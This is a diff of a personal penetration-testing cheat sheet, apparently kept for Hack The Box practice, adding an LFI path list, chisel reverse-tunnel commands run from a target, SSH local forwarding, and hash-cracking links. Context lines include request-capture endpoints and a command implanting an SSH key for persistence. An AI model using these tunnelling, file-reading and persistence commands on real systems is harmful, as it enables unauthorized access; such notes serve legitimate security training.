@@ -23,6 +23,7 @@
 <!-- /TOC -->
 # Useful stuff
 ## Paths
+[lfi list](https://github.com/hussein98d/LFI-files/blob/master/list.txt)\
 /etc/nginx/nginx.conf\
 /etc/nginx/sites-enabled/(deafult)\
 /etc/nginx/sites-available\
@@ -45,6 +46,8 @@ gobuster\
 hashcat\
 johntheripper\
 nmap\
+searchsploit - metasploit\
+chisel
 
 ## Commands
 netstat -antp\
@@ -61,12 +64,26 @@ ngrok tcp 80\
 `dig` to resolve your tunnel hostname and use ip instead
 
 ## Port Forwarding
-when you find a service on a machine running only locally you can forward it to your local port using: Esempio: [exploit.](../hack_the_box/htb_machines/sightless/writeup.md)
-- when you already have ssh (user):\
-`ssh -L 9090:localhost:8080 remote_user@host.htb`\
-then visiting localhost:9090 you can access the service on host.htb:8080 (might need to add domain to /etc/hosts)
-- when you dont have but a simple remote shell:\
-`search chisel or others`
+when you find a service on a machine running only locally you can forward it to your local port using: 
+- when you already have ssh (user):
+  ```bash
+  ssh -L 9090:localhost:8080 remote_user@host.htb
+  ```
+  then visiting `localhost:9090` you can access the service on host.htb:8080 (might need to add domain to /etc/hosts). Esempio: [exploit.](../hack_the_box/htb_machines/sightless/writeup.md)
+
+- CHISEL: when you dont have ssh but a simple remote shell
+
+  - ON YOUR MACHINE: 
+  ```
+  chisel server -p s_chisel_port --reverse
+  ```
+  - ON TARGET MACHINE: 
+  ```
+  chisel client your_ip:s_chisel_port R:tunnel_port:localhost:service_port_to_forward
+  ```
+
+  then you access the service you wanted to forward by visiting `http://localhost:tunnel_port` on your browser
+
 
 
 ## Websites
@@ -77,6 +94,8 @@ intercept and modify requests, public endpoint:
 - https://pipedream.com/requestbin 
 - https://webhook.site/#!/view/36d22d40-393f-4680-a239-cf0d7488e238 
 - https://testt.free.beeceptor.com
+
+hash cracking: https://crackstation.net/
 
 ## Implanting SSH keys
 `echo "Your SSH public key here (id_rsa.pub)" > /home/<user>/.ssh/authorized_keys`
